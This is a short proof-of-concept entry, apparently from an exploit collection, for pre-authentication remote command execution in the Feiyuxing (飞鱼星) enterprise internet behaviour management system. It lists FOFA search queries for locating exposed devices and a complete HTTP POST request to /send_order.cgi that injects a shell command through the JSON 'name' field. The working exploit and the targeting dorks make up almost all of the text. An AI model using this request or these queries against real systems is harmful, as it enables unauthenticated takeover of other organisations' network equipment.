## 飞鱼星上网行为管理系统企业版前台RCE


## fofa
```
title="飞鱼星企业"
title="飞鱼星企业级智能上网行为管理系统"
```

## poc
```
POST /send_order.cgi?parameter=operation HTTP/1.1
Host: 127.0.0.1
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 68

{"opid":"777777777777777777","name":";uname -a;echo ","type":"rest"}
```

![d3caa0beea2be24633c0996d8ae8819c](https://github.com/wy876/POC/assets/139549762/1be7ce47-2ee2-476c-af85-c258c27dc95f)
